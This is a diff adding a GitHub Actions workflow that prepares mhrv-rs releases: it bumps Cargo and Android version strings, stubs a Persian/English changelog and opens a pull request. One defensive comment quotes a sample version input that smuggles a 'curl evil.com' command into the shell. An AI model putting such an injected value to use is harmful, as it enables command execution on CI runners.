@@ -1,0 +1,296 @@
+# Prepare a new release: bump version strings, prefill the changelog
+# stub from release-drafter's draft, and open a PR. After the PR is
+# merged, you push the `v<version>` tag manually and `release.yml`
+# takes over (matrix build → GitHub release → Telegram notify).
+#
+# Triggered manually from the Actions UI or via:
+#   gh workflow run prepare-release.yml -f version=1.6.6
+#
+# What it bumps in the PR:
+#   - Cargo.toml                        version = "X.Y.Z"
+#   - Cargo.lock                        mhrv-rs entry's version
+#   - android/app/build.gradle.kts      versionName = "X.Y.Z"
+#                                       versionCode = previous + 1
+#
+# What it leaves alone:
+#   - tunnel-node/Cargo.toml — versioned independently from the app.
+#     The docker tunnel image is tagged from the git release tag (not
+#     from this Cargo.toml), so we don't need to touch it.
+#
+# What it prefills in docs/changelog/v<version>.md:
+#   - Persian section: an inline `[FA] translate ...` placeholder line.
+#     Visible if not edited — ships into the release page as an obvious
+#     marker rather than a quiet comment leak.
+#   - Separator: `---`
+#   - English section: bullets pulled from release-drafter's `next`
+#     draft release, each suffixed with `: <expand>` to remind you to
+#     add an explanatory clause in the project's existing
+#     `• headline (#NN): full explanation` style. If no draft exists
+#     yet (e.g. immediately after installing release-drafter, before
+#     any PRs have merged), the English section is empty and you fill
+#     it in by hand.
+
+name: prepare-release
+
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'New version to release (without the leading v). Example: 1.6.6'
+        required: true
+        type: string
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  bump:
+    runs-on: ubuntu-latest
+    steps:
+      # Always check out main, regardless of which branch the dispatch
+      # was fired from. workflow_dispatch can be triggered from any ref;
+      # without an explicit `ref:` the version bumps would land on top
+      # of whatever branch the dispatcher had checked out, and the
+      # resulting PR would carry that branch's diffs alongside the bumps.
+      - uses: actions/checkout@v4
+        with:
+          ref: main
+          fetch-depth: 0  # need tag history for the duplicate-tag check below
+
+      - name: Validate version
+        id: ver
+        env:
+          # Pass the dispatch input through an env var rather than
+          # `${{ inputs.version }}` interpolation. GitHub interpolates
+          # the expression *before* the shell parses the script, so a
+          # value like `1.0.0"; curl evil.com; echo "` would execute
+          # before the regex check below ever ran. workflow_dispatch
+          # is gated to write-access users so practical risk is low,
+          # but this is the pattern GitHub's own docs recommend for
+          # defense in depth.
+          INPUT_VERSION: ${{ inputs.version }}
+        run: |
+          set -euo pipefail
+          VER="$INPUT_VERSION"
+          VER="${VER#v}"
+          if ! [[ "$VER" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "::error::version '$VER' is not in X.Y.Z format"
+            exit 1
+          fi
+          if git rev-parse "v${VER}" >/dev/null 2>&1; then
+            echo "::error::tag v${VER} already exists; pick a different version"
+            exit 1
+          fi
+          BRANCH="release/v${VER}"
+          if git ls-remote --exit-code --heads origin "$BRANCH" >/dev/null 2>&1; then
+            echo "::error::branch $BRANCH already exists on origin; delete it or pick a different version"
+            exit 1
+          fi
+          echo "version=${VER}" >> "$GITHUB_OUTPUT"
+          echo "branch=${BRANCH}" >> "$GITHUB_OUTPUT"
+
+      - name: Bump Cargo.toml + Cargo.lock
+        env:
+          NEW_VER: ${{ steps.ver.outputs.version }}
+        run: |
+          set -euo pipefail
+          # Edit both files via Python so we anchor on the `name = "mhrv-rs"`
+          # line and only touch the package's own version, not unrelated
+          # `version = "..."` lines elsewhere in the lockfile.
+          python3 <<'PY'
+          import os, re, pathlib, sys
+          ver = os.environ["NEW_VER"]
+          for path in ("Cargo.toml", "Cargo.lock"):
+              p = pathlib.Path(path)
+              src = p.read_text()
+              new = re.sub(
+                  r'(name = "mhrv-rs"\nversion = ")[0-9.]+(")',
+                  rf'\g<1>{ver}\g<2>',
+                  src,
+                  count=1,
+              )
+              if new == src:
+                  sys.exit(f"ERROR: mhrv-rs version line not found in {path}")
+              p.write_text(new)
+              print(f"{path} -> {ver}")
+          PY
+
+      - name: Bump android versionName + versionCode
+        env:
+          NEW_VER: ${{ steps.ver.outputs.version }}
+        run: |
+          set -euo pipefail
+          # versionCode increments by 1 on every release; versionName mirrors
+          # the Cargo version. Both live in android/app/build.gradle.kts.
+          python3 <<'PY'
+          import os, re, pathlib, sys
+          ver = os.environ["NEW_VER"]
+          p = pathlib.Path("android/app/build.gradle.kts")
+          src = p.read_text()
+          m = re.search(r'versionCode\s*=\s*(\d+)', src)
+          if not m:
+              sys.exit("ERROR: versionCode not found in build.gradle.kts")
+          old_code = int(m.group(1))
+          new_code = old_code + 1
+          src = src[:m.start(1)] + str(new_code) + src[m.end(1):]
+          src, n = re.subn(
+              r'versionName\s*=\s*"[^"]+"',
+              f'versionName = "{ver}"',
+              src,
+              count=1,
+          )
+          if n == 0:
+              sys.exit("ERROR: versionName not found in build.gradle.kts")
+          p.write_text(src)
+          print(f"android/app/build.gradle.kts -> versionName={ver}, versionCode={old_code}->{new_code}")
+          PY
+
+      - name: Fetch release-drafter draft body
+        id: draft
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          # release-drafter accumulates merged-PR titles into a draft tagged
+          # `next`. Pull its body for the changelog stub. `--repo` is set
+          # explicitly so we always look up the release in this repo even
+          # if a future maintainer ever creates a real `next` git tag in a
+          # fork or upstream. If no draft exists yet (release-drafter just
+          # installed, no PRs merged since), the `|| true` keeps us going
+          # with an empty body — you fill the English section by hand.
+          # `--jq 'select(.isDraft) | .body'` returns nothing if `next` is
+           # not a draft (i.e. someone manually published a release with
+           # tag `next`, or pushed a real `next` git tag with a release
+           # attached). On that path we treat it as "no draft" and fall
+           # through to the empty-body branch — better than echoing a
+           # surprise release body into the changelog stub.
+          BODY=$(gh release view next --repo "${{ github.repository }}" \
+                   --json body,isDraft --jq 'select(.isDraft) | .body' 2>/dev/null || true)
+          if [ -z "$BODY" ]; then
+            echo "::notice::no release-drafter 'next' draft found; English section will be empty"
+          else
+            echo "::notice::pulled $(printf '%s' "$BODY" | wc -l) lines from draft release"
+          fi
+          # Multiline outputs need a heredoc-style delimiter — pick one that
+          # cannot appear in a release-drafter bullet line.
+          {
+            echo 'body<<__DRAFT_BODY_EOF__'
+            printf '%s\n' "$BODY"
+            echo '__DRAFT_BODY_EOF__'
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Write changelog stub
+        env:
+          NEW_VER: ${{ steps.ver.outputs.version }}
+          DRAFT_BODY: ${{ steps.draft.outputs.body }}
+        run: |
+          set -euo pipefail
+          # Build the file with shell `echo`/`printf` (not a YAML-level
+          # heredoc with $-double-curly interpolation) so backticks, dollar
+          # signs, or EOF tokens in the draft body can't break us.
+          #
+          # Why no TODO/instructional <!-- comments -->:
+          # release.yml strips leading <!-- comment --> blocks from the
+          # file before publishing the GitHub Release body, and the
+          # Telegram script does the same — both via a regex that handles
+          # multiple consecutive comments. But relying on stripping is
+          # brittle: a maintainer adding a new comment with a different
+          # shape (multi-line, indented, etc.) could leak it. Instead we
+          # use VISIBLE placeholders below. If the maintainer forgets to
+          # edit them, they ship as obvious `[FA]`/`<expand>` markers
+          # that an admin will spot in the release page within seconds.
+          mkdir -p docs/changelog
+          OUT="docs/changelog/v${NEW_VER}.md"
+          {
+            echo '<!-- see docs/changelog/v1.1.0.md for the file format: Persian, then `---`, then English. -->'
+            echo '[FA] translate the English bullets below into Persian and replace this line.'
+            echo ''
+            echo '---'
+            # Append the English section if release-drafter had any.
+            # Skip the printf entirely on empty so we don't leave a
+            # trailing blank line under `---`.
+            if [ -n "$DRAFT_BODY" ]; then
+              # Strip Conventional-Commit prefixes (`feat:`, `fix(android):`,
+              # etc.) from the start of each bullet headline. PR titles in
+              # this repo all carry these prefixes by convention, but the
+              # existing changelog style is verb-first ("Add X" / "Fix Y"),
+              # not type-first. Stripping here saves the maintainer one
+              # manual step per bullet; they still need to fix the verb
+              # tense (e.g. "added" → "Add") since GitHub PR titles tend
+              # to be past-tense and the changelog convention is imperative.
+              #
+              # Bullet shape from release-drafter is:
+              #   • feat(scope): title text ([#NN](url)): <expand>. Thanks @user
+              # After this sed:
+              #   • title text ([#NN](url)): <expand>. Thanks @user
+              printf '%s\n' "$DRAFT_BODY" \
+                | sed -E 's/^(• )(feat|fix|chore|docs?|refactor|perf|test|build|ci|style|revert)(\([^)]*\))?!?: */\1/i'
+            fi
+          } > "$OUT"
+          echo "wrote $OUT ($(wc -l < "$OUT") lines)"
+
+      # No `Ensure release-prep label exists` step here — release-drafter's
+      # workflow runs on every push to main, and its `Ensure autolabeler
+      # labels exist` step creates `release-prep` (along with the type:*
+      # labels). Since these workflow files only land via a push to main,
+      # release-drafter's bootstrap necessarily runs before the first
+      # prepare-release dispatch. If for some reason release-drafter is
+      # disabled, `gh pr create --label release-prep` below will fail with
+      # an actionable "label not found" — fix is to re-enable
+      # release-drafter or run `gh label create release-prep` once by hand.
+
+      - name: Commit, push, and open PR
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          NEW_VER: ${{ steps.ver.outputs.version }}
+          BRANCH: ${{ steps.ver.outputs.branch }}
+        run: |
+          set -euo pipefail
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git checkout -b "$BRANCH"
+          git add Cargo.toml Cargo.lock android/app/build.gradle.kts \
+                  "docs/changelog/v${NEW_VER}.md"
+          git commit -m "release: prepare v${NEW_VER}"
+          git push -u origin "$BRANCH"
+
+          # Write the PR body to a file rather than fight nested heredoc
+          # escaping in the YAML run: block.
+          #
+          # IMPORTANT: this heredoc terminator (`MSG`) is INTENTIONALLY
+          # unquoted so that ${NEW_VER} and ${BRANCH} expand. Backticks
+          # in the body are escaped (\`) for the same reason. If you
+          # paste anything into the template below, watch out for `$(...)`
+          # and unescaped backticks — they will execute at workflow run
+          # time. To add a static block that should NOT interpolate, build
+          # it with a separate `<<'STATIC'` heredoc and concat afterward.
+          cat > /tmp/pr-body.md <<MSG
+          Automated version bump for **v${NEW_VER}**.
+
+          Bumped in this PR:
+          - \`Cargo.toml\` and \`Cargo.lock\` → ${NEW_VER}
+          - \`android/app/build.gradle.kts\` → versionName=${NEW_VER}, versionCode incremented by 1
+          - \`docs/changelog/v${NEW_VER}.md\` stubbed; English bullets prefilled from release-drafter's \`next\` draft
+
+          **Before merging — finish the changelog on this branch:**
+          1. Check out this branch locally: \`git fetch && git checkout ${BRANCH}\`
+          2. In \`docs/changelog/v${NEW_VER}.md\`:
+             - **Persian section:** replace the \`[FA] translate ...\` line with the Persian bullets above the \`---\` separator.
+             - **English section:** for each bullet, (a) fix the verb tense if needed (release-drafter passes through PR titles as-is, so "added" → "Add", "fixed" → "Fix"), and (b) replace \`<expand>\` with a short explanatory clause matching the project's \`• headline (#NN): full explanation\` style. The Conventional-Commit prefix (\`feat:\`/\`fix:\`/etc.) and the trailing \`. Thanks @author\` are already handled.
+          3. Commit + push to this branch so the PR includes the final bilingual changelog.
+
+          Any \`[FA]\` or \`<expand>\` markers left in the file will ship verbatim into the GitHub Release page and the Telegram post — they're intentionally visible, not hidden in HTML comments.
+
+          **After merging — ship it:**
+          1. \`git checkout main && git pull\`
+          2. \`git tag v${NEW_VER} && git push origin v${NEW_VER}\`
+          3. \`release.yml\` picks up the tag, builds artifacts, creates the GitHub release, and (if enabled) posts to Telegram.
+          MSG
+
+          gh pr create \
+            --base main \
+            --head "$BRANCH" \
+            --title "release: prepare v${NEW_VER}" \
+            --label "release-prep" \
+            --body-file /tmp/pr-body.md
